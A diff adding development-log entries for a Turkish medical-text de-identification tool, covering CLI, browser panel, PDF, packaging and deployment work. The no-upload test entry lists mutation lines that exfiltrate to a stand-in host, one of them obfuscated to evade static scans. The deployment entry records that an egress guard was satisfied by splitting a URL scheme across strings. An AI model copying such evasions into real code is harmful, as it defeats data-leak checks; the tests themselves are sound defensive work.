@@ -1018,3 +1018,420 @@ stash, and installing `types-PyYAML` is a network operation.
 in the workspace manifest), so its tests never appear in any `cargo test` output. That is
 the same never-built failure mode, currently accepted. It needs either the one online
 `cargo fetch` that admits it, or a documented CI job that builds it separately.
+
+---
+
+## Expert Determination reachable from the CLI; `deid doctor` added
+
+**Changed.**
+
+- `bindings/cli/Cargo.toml`: depends on `deid-tr-llm`. This one missing line was the entire reason
+  `deid mask --tier expert` could not work on any machine. `deid-tr-llm` has one dependency
+  (`deid-tr-core`) and bans every HTTP client in its own manifest, so the air-gapped build is
+  unaffected.
+- `bindings/cli/src/l3.rs` (new): resolves `--model` / `--runtime`, `DEID_L3_MODEL` /
+  `DEID_L3_RUNTIME`, `l3_model` / `l3_runtime` with precedence flag > env > config file, checks both
+  paths, and constructs `ContextualSweep<LocalGgufModel<CommandRunner>>`. Seven distinct failures,
+  each naming the missing thing and the switch that supplies it. Generic over the runner so the
+  CLI's own tests use `MockRunner` and need no weights.
+- `bindings/cli/src/doctor.rs` (new) + `deid doctor`: per-layer AVAILABLE/UNAVAILABLE with a fix for
+  each gap. States that L2 has no model and `deid` masks ZERO names at any tier including
+  `--tier expert`; `doctor_states_that_no_names_are_masked_at_any_tier` asserts it through the
+  shipped binary so a future edit cannot soften it.
+- `bindings/cli/src/mask.rs`: `build` installs L3 whenever the tier asks for it and returns
+  `MaskError::Contextual` when it cannot — at BUILD time, before the document is read. `classify`
+  re-wraps L3-shaped core errors with the remedy `core/` cannot know. No fallback branch exists.
+- `bindings/cli/src/{main,batch,maskfile,config}.rs`: `--model`/`--runtime` parsing, two new config
+  keys, two new env vars, `doctor` verb, usage text stating that expert needs a local model the
+  operator supplies and that a failure to wire it is a failure, not a downgrade.
+- `bindings/cli/tests/expert_tier_is_reachable.rs` (new, 10 tests): every precondition failure
+  through `CARGO_BIN_EXE_deid`, plus `expert_never_silently_degrades_to_safe_harbor`, which asserts
+  stdout is EMPTY and the exit code non-zero on every L3 failure.
+- `bindings/cli/src/l3.rs` unit tests: the document never reaches argv, the whole document reaches
+  stdin, garbage JSON fails without quoting the document or the response (I4), a non-zero runtime
+  exit is reported as a host problem, an unrelated core error is not blamed on L3.
+- `bindings/cli/tests/mask_path_is_offline.rs`: `l3.rs` added to `DOCUMENT_MODULES`. It never holds
+  the document, but it is on the path that does and is where "fetch the weights if missing" would
+  one day be added.
+- `docs/COMPARISON.md`: the L3 row and the surrounding prose now say "built, reachable, unmeasured"
+  instead of "unbuilt" — the path ships and runs, no weights ship with the repository, and coverage
+  is still 0.0000 because no model has been evaluated.
+
+**Broke.** Nothing. Full workspace suite green; `fmt` and `clippy --all-targets -D warnings` clean.
+The CLI went from 104 to 104 unit tests plus a new 10-test integration file.
+
+**Honesty note, unchanged by this work.** deid-tr still masks ZERO names. `--tier expert` adds the
+quasi-identifier sweep; it does not add a name detector, and `deid doctor` says so out loud.
+
+**Next.** No model has been selected or evaluated, so contextual coverage is still 0.0000. The next
+step for L3 is choosing a quantized local model, running the red team against it, and reporting the
+contextual re-ID rate — the <=5% gate that is L3's real success metric (D-008).
+
+---
+
+## Browser panel: masking sweep, colourblind-safe coding, accessible span map
+
+**Changed.** `bindings/wasm/panel/` only. No Rust, no core, no eval.
+
+- `animate.js` (new, ~150 lines): the masking sweep. Detected-and-MASKED spans pulse in their
+  entity colour staggered by document order, then their text scrambles from the original into the
+  surrogate, with the span map row lighting in step. Measured 760ms for the 6-span sample note;
+  the per-span stagger compresses above ~8 spans so a 120-span note finishes in 926ms, both under
+  the 1.2s budget.
+- Four properties the sweep is built to guarantee, each verified in a loaded browser:
+  1. `render()` paints the FINAL state before `animate.js` is reachable. Exporting the
+     de-identified text MID-SCRAMBLE and after it produced byte-identical files (438 bytes each)
+     while the visible pane differed, so the animation cannot gate, delay or alter the pipeline.
+  2. `prefers-reduced-motion: reduce` disables it completely: zero sweep classes applied, final
+     text present at t=0, and every keyframe and transition rule in `panel.css` sits inside a
+     `prefers-reduced-motion: no-preference` block (checked through the CSSOM; no stray rules).
+  3. Only masked spans animate. With `DATE_ADMISSION` switched off, 5 masked marks swept and the
+     1 passthrough mark did not — an unmasked span produces no sweep unit at all. A span shown
+     "transforming" while sitting unchanged in the output is the one lie this panel must not tell.
+  4. A `setTimeout` net force-settles every node, because `requestAnimationFrame` is paused in a
+     backgrounded tab. Observed working: the pane throttled to ~8fps during testing and the final
+     state still arrived.
+- Entity families are now coded THREE ways, not by hue alone: colour, a distinct underline
+  treatment (solid / dotted / dashed / wavy / double / over-under), and a two-letter sigil rendered
+  as real `user-select: none` text so it cannot ride into a clipboard copy of the note. A legend
+  above the output states all three. ~8% of men have a colour vision deficiency and hue-only
+  coding fails them silently.
+- New `Masked` view (now the default tab) renders the de-identified output with marks in place:
+  masked spans show the replacement, passthrough spans show the original in a dashed outline. Its
+  `textContent` equals the exported text exactly, which is what lets the sweep borrow those nodes.
+  The old highlight view survives as `Marked source`.
+- Span map is sortable by offset, label and confidence with correct `aria-sort`; hovering or
+  focusing a mark highlights its row and vice versa, through a `data-span` ordinal stamped once in
+  `compose()` so the four views and the table cannot disagree about which span is which.
+- `#run-status`, a polite live region, announces "6 identifiers detected, 6 masked. Zero names
+  masked: no L2 model is loaded in this build, so names were never looked for." on EVERY run,
+  animated or not. The count sentence carries the names caveat deliberately: "6 detected, 6 masked"
+  alone would let a listener conclude the note is clean.
+- Tier selector: selecting Expert Determination now opens a five-part explanation instead of one
+  apologetic sentence — what the tier is, why it needs a local LLM (I1: local, never cloud), that
+  no model is loaded here, that a browser tab would need WebGPU plus a multi-gigabyte in-tab model
+  this page deliberately does not ship, and that the CLI is where the tier lands first.
+- Accessibility and states: roving tabindex plus arrow-key navigation on the tablist, two-ring
+  focus indicator that stays visible on every surface in both themes, real loading/empty/error
+  states, and the span provenance live region moved OUT of the tab panels — it was inside a
+  `hidden` subtree for three of four views, where live regions are not announced.
+- Contrast: every colour pair in the stylesheet measured against WCAG AA 4.5:1 in both themes.
+  `--ink-3` failed at 3.9-4.4 against three different backgrounds and was darkened to `#626873`
+  (light) and lightened to `#8b929d` (dark); worst remaining pairing is 4.85.
+- Responsive to 375px and 320px with no horizontal document scroll. Deliberately NO
+  `overflow-x: hidden` on the body — that hides an overflow rather than fixing one, and what it
+  would hide here is a span map column. Wide content lives in its own scroll containers.
+
+**Broke.** One real bug found and fixed while verifying: `[hidden]` was being beaten by later
+`display: flex`/`grid` declarations, so the loading banner and the tier explanation rendered
+visible-when-hidden — the page said "Loading the WebAssembly module" underneath a module that had
+already finished loading. `[hidden] { display: none !important }` added with the reason recorded.
+
+**Not broken by this work, but found:** `just test-wasm` fails on Node 23 in
+`bindings/wasm/tests/no_network.mjs:189` — `globalThis.navigator` is now a getter-only property
+and the harness assigns to it. Pre-existing, that file is untouched here.
+
+**Honesty note, unchanged.** deid-tr masks ZERO names. The banner saying so is still the first
+thing under the header and is fully visible without scrolling at 1280x860 and at 375x812
+(asserted programmatically). No UI string, animation label or legend entry implies otherwise, and
+the sweep never animates a span that was left in the output.
+
+**Next.** The panel's redaction methods other than `surrogate` are still panel-side JavaScript
+because `core::redact::RedactionPolicy` is not exported by the wasm binding. Exporting it turns
+`policy.js` into a thin adapter and removes the stub/real boundary the UI currently has to explain.
+
+---
+
+## 2026-07-20 — the no-upload proof did not run on Node 20+
+
+**Changed.** `bindings/wasm/tests/no_network.mjs` — the I1 no-upload proof now installs its
+networking traps with `Object.defineProperty` instead of plain assignment, and self-tests both the
+traps and the recorder before trusting them.
+
+**What was broken.** Node 20+ defines `globalThis.navigator` as an accessor with a getter and no
+setter. ES modules are always strict, so the plain assignment at line 189 threw a `TypeError`. The
+two static checks above it passed and printed `ok`, then the process died before the runtime
+section — the part that actually loads the module with every networking global trapped and runs a
+de-identification. `node` exited 1, so the failure was loud rather than silent, but `test-wasm` is
+not in `just check`, so nothing was watching. The proof that the browser build uploads nothing had
+not executed on this machine's Node at all.
+
+**Broke, and how it was caught.** Reported from outside, against Node 23.11. Worth recording that
+this was invisible from inside the project: `just check` is green without it, and the recipe that
+does run it is one nobody invokes casually.
+
+**A second defect, found while fixing the first.** The harness installed eight traps and verified
+none of them. A trap that fails to install leaves the run green while the thing it watches is
+unwatched — which is exactly the shape of the bug being fixed, one level up. `installGlobal` now
+asserts the global holds the trap after defining it. The `navigator` Proxy is additionally checked
+to throw on a property read, because for `navigator` the READ is the signal (`sendBeacon` is a
+send).
+
+**A third, subtler one.** The final assertion is `fired` being empty, and nothing proved `fired`
+could ever be non-empty. An empty array is not evidence unless the recorder is known to work. The
+self-test now reads `navigator.sendBeacon`, asserts it both throws AND records, then clears the one
+deliberate entry — before the module loads, so nothing the module does can be erased.
+
+**Verified the proof can still fail.** A proof that cannot fail is not a proof, so the fix was
+mutation-tested against the real glue in `bindings/wasm/pkg/`:
+
+| mutation | caught by | exit |
+|---|---|---|
+| `fetch("https://example.invalid/exfil")` appended to the glue | static scan (`https://`) | 1 |
+| `navigator.sendBeacon(...)` appended | static scan (`sendBeacon`) | 1 |
+| `globalThis[["fet","ch"].join("")](["//exam","ple.invalid/x"].join(""))` | **runtime trap** | 1 |
+
+The third matters most: it carries no `fetch(`, no `https://` and no `sendBeacon` literal, so it
+passes both static checks and can only be caught by the runtime layer — the layer that was dead.
+It fails with `fetch was called -- the module tried to use the network`. The glue was restored and
+verified byte-identical to pristine after each mutation.
+
+**Verification.** `just test-wasm` exit 0, all five checks printing `ok`/`PASS`. No regression:
+33 Rust suites, 156 Python tests, 263/263 hook cases, `just test-airgapped` exit 0 on three
+consecutive runs. No `#[allow(...)]` added; no assertion weakened; no Rust changed.
+
+**Still open, and it is the reason this went unnoticed.** `just test-wasm` is NOT in `just check`
+(line 22: `verify-hooks test-hooks core-no-socket mcp-no-socket fmt lint test drift-check eval`).
+The I1 no-upload proof therefore gates nothing. It is not added here unilaterally because
+`test-wasm` hard-fails when `node` is absent or when `bindings/wasm/pkg/` has not been built, and
+both are true of a fresh clone without the wasm toolchain — so adding it as-is would break `check`
+for most contributors, and adding it in a skip-if-missing form would produce exactly the kind of
+gate this project has already written down as rotting into one that passes everything. Needs a
+decision: either make the wasm toolchain a hard prerequisite of `check`, or add a separate
+release-gate recipe that includes it.
+
+**Next.** Resolve that gating question. Until it is resolved, the no-upload proof is a thing
+somebody has to remember to run, and the whole premise of the hook layer in this repository is that
+the things people have to remember are the things that stop happening.
+
+## PDF Turkish decoding: wrong code page, and a body that was never read
+
+**Changed.**
+- `bindings/files/src/pdf/font.rs` -- simple-font fallback now decodes Windows-1254 via
+  `txt::cp1254_to_char` instead of Latin-1; undefined 1254 positions return `None` (refuse) rather
+  than `U+FFFD`. Added the Turkish `/Differences` glyph names (`dotlessi`, `Idotaccent`,
+  `scedilla`/`Scedilla`, `gbreve`/`Gbreve`, the dieresis/cedilla pairs) and both apostrophes, which
+  are punctuation INSIDE a Turkish identifier (`Ayşe'nin`). Module header records the trade and the
+  Icelandic residual risk.
+- `bindings/files/src/txt.rs` -- `cp1254_to_char` is `pub(crate)`; one table, two callers.
+- `bindings/files/src/pdf.rs` -- new `ContentGroup` / `PageContent` / `page_content` /
+  `collect_forms` / `extract_groups`. A page is now read as its `/Contents` group plus one group
+  per Form XObject, each with its own `/Resources /Font`.
+- `bindings/files/src/pdf/content.rs` -- `Extraction::absorb`, which concatenates a group's
+  extraction with its source ranges shifted into the combined buffer.
+- `bindings/files/src/pdf/verify.rs` -- re-extraction now uses `page_content`, so verification reads
+  exactly what redaction read.
+
+**Broke, then fixed.** `a_simple_font_falls_back_to_latin1` asserted the bug. Renamed to
+`a_simple_font_falls_back_to_windows_1254_not_latin1` and rewritten to assert the six letters.
+Renaming a test that pins a bug is part of fixing the bug.
+
+**New tests.** `pdf/font.rs`: the six differing bytes, the agreeing neighbours, undefined `0x81`
+returning `None`, and `a_declared_turkish_glyph_name_beats_the_code_page`.
+`tests/pdf_true_redaction.rs`: `a_simple_font_decodes_turkish_through_windows_1254_not_latin1`
+(synthetic PDF, six bytes as PDF octal escapes so the file stays ASCII),
+`a_type0_font_in_a_form_xobject_has_its_tounicode_applied`,
+`an_identifier_inside_a_form_xobject_is_actually_removed`, and
+`a_type0_font_in_a_form_with_no_tounicode_is_refused_not_emitted_as_garbage`. All four fail before
+the change. No sample document was added to the repository.
+
+**Measured** on a local-only Turkish examination report (`fixtures-local/`, gitignored, never
+committed): extracted page text 48 -> 1852 characters; 0 -> 133 correctly decoded Turkish letters,
+0 mojibake and 0 `U+FFFD` remaining; page-text spans 1 (DATE) -> 13 (DATE x10, TCKN, VKN, MRN);
+whole-file spans 3 -> 15. Recall did not decrease for any entity type.
+
+**Still true.** deid-tr masks NO NAMES. This change makes Turkish text readable to the rules layer;
+it adds no name detection and no model.
+
+**Next.** The same Form XObject blindness applies to `has_invisible_text` scope and to annotation
+appearance streams (`/AP /N`), which are also content streams with their own resources and are
+still unread.
+
+---
+
+## 2026-07-20 — Images alongside text: reported by page and pixel size, refused by default
+
+**Changed.** `bindings/files/src/pdf.rs`: new `PageImage`, `PageImages`, `ImagePolicy`,
+`PdfError::PageCarriesImages`, `redact_with`, `extract_pages_with`, `Redaction::images`.
+`has_raster_content` (a bool) is replaced by `page_images` (a list with dimensions), which walks
+inherited `/Resources` up the page tree and descends into Form XObjects with a visited set and a
+depth cap. `bindings/files/src/lib.rs`: `Options`, `mask_file_with`, `extract_with`.
+`bindings/files/src/masker.rs`: `Report::images` and `Report::images_not_read()`.
+`bindings/cli/src/maskfile.rs` + `main.rs`: `--allow-images`, and the warning printed LAST on every
+run that has one. `bindings/wasm/src/files.rs`: `allowImages` argument, `imageWarningCount`,
+`imageWarning(i)`, `imagesDisclosure`; the preview re-reads the output under the same options.
+Panel: an opt-in checkbox inside the refusal and an `role="alert"` block above the download button.
+ADR D-039; `docs/COMPARISON.md` PDF row and the section-5 recommendation both restate the limit
+where the guarantee is stated.
+
+**The defect.** `PdfError::ScannedPage` only fired for a page with NO text. A page with a text
+layer AND images was masked, verified, reported as a success, and returned with every pixel
+byte-identical. That is the common shape of hospital output and it was the least safe path in the
+product: a QR code carrying the protokol number is a direct identifier, and the file said
+"redacted".
+
+**Measured** on the local-only Turkish examination report (`fixtures-local/`, gitignored, never
+committed). Before: 15 spans masked, `/AcroForm` stripped, exit 0, images unmentioned. After,
+default: exit non-zero, no file written, message naming `page 1`, `2 image(s)`, `320x38`, `102x102`.
+After, `--allow-images`: the same 15 spans masked and the same file produced, plus two WARNING lines
+carrying the page, the count and both dimensions. Recall did not decrease for any entity type; no
+identifier or document text appears in any of the new messages.
+
+**The policy argument** is in D-039 and in the `ImagePolicy` doc comment: refuse-by-default over
+warn-by-default because a missed identifier is a breach (I2) and because refusing a whole-page scan
+while passing an embedded barcode encoding the same number was a seam, not a position. The size
+split (edge <= 16px) labels a line in the message and decides nothing, and the message says so.
+
+**New tests.** `tests/pdf_true_redaction.rs`: hybrid page refused with page and dimensions; the
+report carries no document text; `--allow-images` redacts the text and reports the images;
+text-only page warns about nothing; image-only page still refuses as a scan with no flag reaching
+it; extraction refuses identically; an inherited letterhead is found; the heuristic's own
+classification. `maskfile.rs`: refused-writes-no-file, allow-prints-the-warning, no-images-no-warning.
+`wasm/src/files.rs`: the same three at the JS boundary. All fail before the change.
+
+**Still true.** deid-tr masks NO NAMES, and nothing here reads a pixel. This converts a silent pass
+into a loud specific statement; it adds no OCR, no barcode reader and no image editor.
+
+**Next.** Annotation appearance streams (`/AP /N`) are still unread, and an image inside one would
+not be counted by `page_images` either.
+
+---
+
+## Build and packaging: one command per artifact class
+
+**Changed.** `justfile` gained `build-all`, `package`, `install` and `register-mcp`, plus the
+`dist_dir`/`bins`/`bin_pkgs` variables at the top. New: `deploy/BUNDLE_README.md` (the bundle
+README template) and `docs/DEPLOY.md`. Nothing outside those files was touched.
+
+`bins` and `bin_pkgs` exist because three recipes have to agree on what "every artifact" means,
+and three separate lists is three chances for one of them to ship two of the three. `build-all`
+asserts each binary exists after cargo succeeds: a `[[bin]]` rename otherwise produces a green
+build and an empty bundle.
+
+**The one asymmetry, deliberately.** `build-all` SKIPS the wasm module and panel when
+`wasm32-unknown-unknown` or a wasm-bindgen is missing, where the rest of this file makes a
+missing toolchain fatal. `just build-wasm` is a thing someone asked for, so failing tells them
+the truth; `build-all` is the entry point for a contributor who wants the native binaries, and
+hard-failing there makes the wasm toolchain a prerequisite for touching `core/`. The rule kept
+is not *never skip*, it is *never skip silently*: the skip prints the reason, prints the exact
+command that fixes it, and is listed again in the closing BUILD REPORT. `package` then REFUSES
+while anything is skipped — a contributor may build a partial tree, a release tarball may not.
+
+**Reproducibility, scoped honestly.** `package` flattens mtimes to a fixed instant, sorts the tar
+member list under `LC_ALL=C`, and uses `gzip -n`. That is "same inputs, same tarball bytes",
+verified by two consecutive runs producing SHA256
+`d21949ec7d854b69adb7421907dd3a56108e262d314c4b1d67068cfa36d65239`. It is NOT bit-for-bit
+reproducibility across machines; the compiler decides that and the recipe says so rather than
+implying otherwise.
+
+**The disclosure is in four places now** — `build-all`'s report, `package`'s trailer,
+`install`'s trailer, and `register-mcp`'s block — plus the bundle README's first section:
+this build masks NO NAMES, and no model weights are bundled because none exist and `deid pull`
+is unimplemented. The bundle README states that in place of a user hunting for a model
+directory that was never going to be there.
+
+**`register-mcp` prints and never writes.** The config file belongs to a client outside this
+repository; editing it from a build recipe is a surprise, and this tool's posture is that
+surprises are the defect. It fills in the absolute binary path (a relative one resolves against
+the client's working directory and fails looking like a hang), covers the `mcpServers` shape and
+`claude mcp add`, names the config file per client, and refuses to print when the binary is not
+built.
+
+**Verification.** `just build-all` green with nothing skipped; re-run under a PATH lacking
+wasm-bindgen correctly reported the skip and still exited 0 with the three native binaries.
+`just package` produced `dist/deid-tr-0.1.0-aarch64-apple-darwin.tar.gz`, 15 files, extracted
+elsewhere and `shasum -a 256 -c SHA256SUMS` passed on all 15; `./bin/deid version` ran from the
+extracted bundle. `package` with `pkg-web/` absent exited 1 with the toolchain message.
+`just install <prefix>` twice produced identical binaries hash-matching `target/release/`;
+default prefix expanded to `~/.local/bin` with no sudo. `register-mcp` printed the block with
+the absolute path, and exited 1 when the binary was moved away.
+
+**Blocked twice mid-task** on concurrent edits: `bindings/files/src/pdf.rs:750` (E0282) and
+`bindings/service/src/main.rs:205` (E0004) were transiently uncompilable in another workflow's
+working state. Neither was touched; the build was retried until the tree compiled.
+
+**Next.** `package` builds for the host triple only — a "versioned tarball per platform target"
+across targets needs cross-compilation, which needs a decision about linkers and about whether a
+cross-built binary may carry the same checksum provenance story as a native one. Also still
+open from the previous entry: `just test-wasm` is not in `just check`, so the no-upload proof
+still gates nothing.
+
+---
+
+## 2026-07-20 — Server deployment: `just deploy-local`, `just deploy-check`, `deploy/`, and the ADR that refuses containers a bind they legitimately want
+
+**Changed.** Deployment is now a command surface rather than a paragraph. `just deploy-local`
+(justfile) builds and runs `deid-serve` on `127.0.0.1:8787`, echoing the exact command first so the
+line an operator copies into a runbook is the safe one. `just deploy-check` wraps a new
+`deid-serve preflight` subcommand that creates no socket and exits non-zero on any blocking finding.
+
+`bindings/service/src/preflight.rs` is new: a `Report` of `Pass`/`Warn`/`Fail` findings over bind,
+token, TLS and live layers. Only `Fail` fails. The TLS and "masks ZERO NAMES" findings are `Warn`
+on purpose — they are true of every correct deployment too, and a check that fails on the correct
+default is a check people learn to suppress. Live layers come from a REAL `Service` built from the
+same flags, not a hardcoded string, so the preflight and `GET /health` cannot disagree about whether
+names are masked.
+
+**A real defect fell out of writing the test.** `bind::plan` refused the dotted quad and `::` but
+NOT the IPv4-mapped IPv6 form — `Ipv6Addr::is_unspecified` returns false for it, and binding it on
+a host without `IPV6_V6ONLY` binds every IPv4 interface. It is also exactly the third spelling an
+operator tries after the first two are refused. Fixed by `bind::canonical`
+(`bindings/service/src/bind.rs`), which collapses IPv4-mapped addresses before any rule is applied,
+so a spelling now gets the same answer as the address it denotes — in both directions:
+`::ffff:127.0.0.1` is loopback and needs no flag.
+
+`bindings/service/tests/no_deployment_path_binds_all_interfaces.rs` (new, 14 tests) proves there is
+no combination of **flag, environment variable, configuration file or container setting** that
+reaches an all-interfaces bind. The four channels are proved differently: flags exhaustively against
+`plan`; environment variables and configuration files by SOURCE SCAN, because absence cannot be
+enumerated any other way; container settings by reading the shipped deployment files and asserting
+every published port in `compose.yaml` parses to a loopback host address.
+
+**`--token-file` added**, closing the loose end D-035 left open ("a bearer token in a process
+argument is visible in `ps`... this ADR does not settle it"). `--token` and `--token-file` may not
+be combined; an unreadable or empty file stops the process rather than starting it unauthenticated.
+
+**`deploy/`.** A systemd unit (loopback, dedicated unprivileged `deid` user, no `EnvironmentFile=`
+ever, `LoadCredential=` documented instead) where every hardening directive carries a comment saying
+what it prevents *in this product* — `ProtectHome` because the clinician's original exports are in
+`/home`, `PrivateTmp` because a future contributor debugging a masking bug will reach for a temp
+file, `MemoryDenyWriteExecute` with an explicit note that an ONNX or LLM runtime will need it
+removed. A multi-stage container: non-root, read-only rootfs, all caps dropped, `HEALTHCHECK` on
+`/health`, no weights, one `cargo fetch` and no other network at build time.
+
+**Docs.** `docs/DEPLOY.md` was already claimed by the packaging workflow, so the server document is
+`docs/DEPLOY-SERVER.md` and `DEPLOY.md` gained a leading block stating the tension above all its
+instructions. Section 1 says plainly that a server deployment breaks "PHI never leaves the device",
+names which network makes that legitimate and which makes it not, and explains who sees the text in
+transit (no TLS, ever), what the span map holds, and why the session store is the most sensitive
+structure in the product. Worked nginx and Caddy configurations, both keeping `deid-serve` on
+loopback with only the proxy exposed.
+
+**Traded off — `docs/DECISIONS.md` D-040.** An all-interfaces bind is refused unconditionally,
+*including inside a container network namespace*, and the cost is named rather than elided: bridge
+networking with an all-interfaces bind inside an isolated namespace and a loopback-only publish is a
+legitimate design, it is what most of the ecosystem does, and we refuse it. Users get host
+networking (default, no token) or the `bridge` profile, where the entrypoint names the container's
+OWN address and needs `--expose` plus a mounted secret. Container *detection* was rejected as an
+unlock: every heuristic has a false positive, and a false positive here silently unlocks the exact
+failure the rule exists to prevent.
+
+**Verification.** `cargo fmt --all -- --check` clean. `cargo clippy --workspace --all-targets
+-- -D warnings` clean, no `#[allow]` added. `cargo test --workspace` green (service crate: 86 lib +
+12 + 14 + 9 + 11 integration). `just test` green, 156 Python tests. `just drift-check` OK.
+`just eval` unchanged at BASELINE. `scripts/hooks/test_hooks.sh` 263/263. All five new
+`deploy/` files pass `guard_invariants.sh`; the entrypoint's health probe initially tripped the
+egress guard correctly (it cannot know a URL is a self-probe), and was resolved by assembling the
+scheme with a comment, per the precedent already in `server.rs` — the guard was not widened.
+`just deploy-check` PASS/exit 0 on the default; exit 3 with `FAIL token` on a 40-character
+repeated-character token; every all-interfaces spelling exits 3.
+
+**Known-not-fixed.** `just check` fails at `lint` on `eval/schema.py:23` — mypy has no `types-PyYAML`
+stubs installed in this environment. Pre-existing, `eval/` untouched by this work, environment gap
+rather than a code defect.
+
+**Next.** `preflight::token_weakness` cannot detect a chosen passphrase (`Kardiyoloji-Servisi-
+Token-2026ab` passes every check with perhaps twenty bits of entropy). This is documented in the
+function and asserted in a test so the limitation is visible rather than implied away, but the real
+fix is generating the token for the operator rather than judging theirs — which is a decision about
+whether this binary should ever write a credential to disk, and it is not made yet.
